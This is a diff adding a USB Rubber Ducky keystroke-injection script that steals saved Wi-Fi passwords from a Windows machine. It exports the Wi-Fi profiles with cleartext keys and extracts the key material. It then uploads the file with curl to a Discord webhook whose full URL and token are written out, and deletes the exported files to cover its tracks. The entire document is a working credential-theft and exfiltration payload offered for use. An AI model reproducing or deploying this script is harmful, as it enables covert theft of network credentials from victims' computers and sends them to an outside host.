@@ -1,0 +1,35 @@
+REM Ducky Script for Steal Saved WiFi Password
+REM Author - TechChip - Modified by Harrmahar
+REM https://github.com/techchipnet
+REM https://youtube.com/techchipnet
+DELAY 500
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 100
+ENTER
+DELAY 1000
+STRING cd %temp%
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
+ENTER
+DELAY 1000
+DELAY 500
+REM next command will post wifi password on webhook.site
+REM watch demo on techchip youtube channel
+REM Modified to use CURL instead of powershell
+REM DONTFORGET to change Encode Language to "United States" 
+STRING curl -F file1=@WiFi-Key https://discord.com/api/webhooks/1138760324321919038/YMNwr2nXrhjbfgX-3s6TGUxKi4o-zCKVbj1jx41K26SxOTWnTuxLl7aa1ir91xoVTxVo
+ENTER
+DELAY 500
+STRING del Wi* /s/f/q
+ENTER
+DELAY 500
+STRING exit
+ENTER
+REM Subscribe techchip youtube channel
+REM Modified by Harrmahar - 07112023
